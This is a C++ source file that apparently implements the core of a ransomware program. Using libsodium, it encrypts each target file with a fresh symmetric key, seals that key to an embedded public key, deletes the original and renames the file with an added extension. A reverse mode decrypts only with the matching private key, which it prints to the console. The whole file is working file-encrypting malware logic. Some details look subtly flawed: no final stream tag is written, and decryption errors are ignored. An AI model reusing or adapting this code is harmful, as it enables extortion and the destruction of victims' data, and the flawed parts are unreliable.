#include "CryptoManager.hpp"
#include "Logs.hpp"
#include <iostream>
#include <fstream>

#include <iomanip>

cryptoManager::cryptoManager()
{
}
cryptoManager::~cryptoManager()
{
}
cryptoManager::cryptoManager(Config conf, std::vector<fs::path> files) : _conf(conf), _files(files), _header(HEADER_SIZE)
{
    _buffer.resize(BUFFER_SIZE);
}

void cryptoManager::generateSymKey()
{
    crypto_secretbox_keygen(_symKey.data());
}
void cryptoManager::encryptSymmKey()
{
    hexToBinAsymPubKey();
    crypto_box_seal(_symKeyEncrypted.data(), _symKey.data(), _symKey.size(), _asymKeyPub.data());

    // char cipher_hex[_symKeyEncrypted.size() * 2 + 1];
    // sodium_bin2hex(cipher_hex, sizeof(cipher_hex), _symKeyEncrypted.data(), _symKeyEncrypted.size());
    // std::cout << "Encrypted sym key: " << cipher_hex << std::endl;
}

void cryptoManager::writeEncryptSymmKey(std::ofstream &out) const
{
    out.write(reinterpret_cast<const char *>(_symKeyEncrypted.data()), _symKeyEncrypted.size());
}

void cryptoManager::writeHeader(std::ofstream &out) const
{
    out.write(reinterpret_cast<const char *>(_header.data()), _header.size());
}

void cryptoManager::writeEncryptedData(std::ifstream &in, std::ofstream &out)
{

    while (in)
    {
        in.read(reinterpret_cast<char *>(_buffer.data()), _buffer.size());
        std::streamsize bytesRead = in.gcount();
        if (bytesRead > 0)
        {
            unsigned long long clen;
            _encryptedBuffer.resize(bytesRead + STREAM_MAC_SIZE);
            crypto_secretstream_xchacha20poly1305_push(&_state, _encryptedBuffer.data(), &clen, _buffer.data(), bytesRead, nullptr, 0, 0);
            out.write(reinterpret_cast<char *>(_encryptedBuffer.data()), clen);
        }
    }
}

void cryptoManager::init()
{
    if (sodium_init() < 0)
        throw(std::runtime_error("Lipsodium initialization failed"));

    if (_conf.reverse)
    {
        test();
        return;
    }
    Logs logs(_conf.silent);
    FileManager fs;

    for (auto &file : _files)
    {
        std::ifstream in = fs.openOriginalFile(file);
        if (!in)
        {
            logs.printError("Failed to open: " + file.filename().string());
            continue;
        }
        fs::path oldPath = file;
        std::ofstream out = fs.createEncryptedFile(file);
        if (!out)
        {
            logs.printError("Creation of the encrypted file failed for file: " + file.filename().string());
            continue;
        }
        generateSymKey();

        // convertsymKeyToHex();
        // printHExsymKey();

        encryptSymmKey();
        writeEncryptSymmKey(out);
        crypto_secretstream_xchacha20poly1305_init_push(&_state, _header.data(), _symKey.data());
        writeHeader(out);
        writeEncryptedData(in, out);
        fs::remove(oldPath);
        fs.addFtExt(file);
    }
}

void cryptoManager::test()
{
    FileManager fs;
    Logs logs(_conf.silent);

    hexToBinPrivKey();
    for (auto &file : _files)
    {
        std::ifstream in = fs.openOriginalFile(file);
        if (!in)
        {
            logs.printError("Failed to open: " + file.filename().string());
            continue;
        }
        fs::path oldPath = file;
        std::ofstream out = fs.createPLainFile(file);
        if (!out)
        {
            logs.printError("Creation of the encrypted file failed for file: " + file.filename().string());
            continue;
        }
        in.read(reinterpret_cast<char *>(_symKeyEncrypted.data()), _symKeyEncrypted.size());
        hexToBinAsymPubKey();

        if (crypto_box_seal_open(
                _symKey.data(),
                _symKeyEncrypted.data(),
                _symKeyEncrypted.size(),
                _asymKeyPub.data(),
                _asymKeyPriv.data()) != 0)
        {
            logs.printError("Failed to decrypt symmetric key");
            continue;
        }

        // convertsymKeyToHex();
        // std::cout << "sym key = " << _hex_symKey.data() << std::endl;
        in.read(reinterpret_cast<char *>(_header.data()), _header.size());
        if (crypto_secretstream_xchacha20poly1305_init_pull(
                &_state,
                _header.data(),
                _symKey.data()) != 0)
        {

            logs.printError("Invalid key or header");
        }
        _encryptedBuffer.resize(ENCRYPTED_BUFFER_SIZE);
        unsigned char tag;
        unsigned long long out_len;

        while (in)
        {
            in.read(reinterpret_cast<char *>(_encryptedBuffer.data()), _encryptedBuffer.size());
            std::streamsize bytesRead = in.gcount();
            if (bytesRead > 0)
            {
                if (crypto_secretstream_xchacha20poly1305_pull(
                        &_state,
                        _buffer.data(),
                        &out_len,
                        &tag,
                        _encryptedBuffer.data(),
                        bytesRead,
                        nullptr,
                        0) != 0)
                {
                    logs.printError("Data decryption failed");
                }
            }
            out.write(reinterpret_cast<char *>(_buffer.data()), out_len);
            if (tag == TAG_FINAL)
                break;
        }
        fs::remove(oldPath);
        fs.removeFtExt(file);
    }
}

//------------------------------------------------------------------------

void cryptoManager::hexToBinPrivKey()
{
    // sodium_hex2bin(_asymKeyPriv.data(), _asymKeyPriv.size(), _conf.reverseKey.c_str(), _conf.reverseKey.size(), nullptr, nullptr, nullptr);
    if (sodium_hex2bin(
            _asymKeyPriv.data(),
            _asymKeyPriv.size(),
            _conf.reverseKey.c_str(),
            _conf.reverseKey.size(),
            nullptr, nullptr, nullptr) != 0)
    {
        std::cerr << "Invalid hex private key" << std::endl;
    }
    char pk_hex[crypto_box_SECRETKEYBYTES * 2 + 1];
    sodium_bin2hex(pk_hex, sizeof(pk_hex), _asymKeyPriv.data(), _asymKeyPriv.size());
    std::cout << "Private key: " << pk_hex << std::endl;
}

void cryptoManager::convertsymKeyToHex()
{
    sodium_bin2hex(_hex_symKey.data(), _hex_symKey.size(), _symKey.data(), _symKey.size());
}

void cryptoManager::hexToBinAsymPubKey()
{
    sodium_hex2bin(_asymKeyPub.data(), _asymKeyPub.size(), ASYM_KEY_PUB.c_str(), ASYM_KEY_PUB.size(), nullptr, nullptr, nullptr);
}

void cryptoManager::printHExsymKey()
{
    std::cout << "sym Key = " << _hex_symKey.data() << std::endl;
}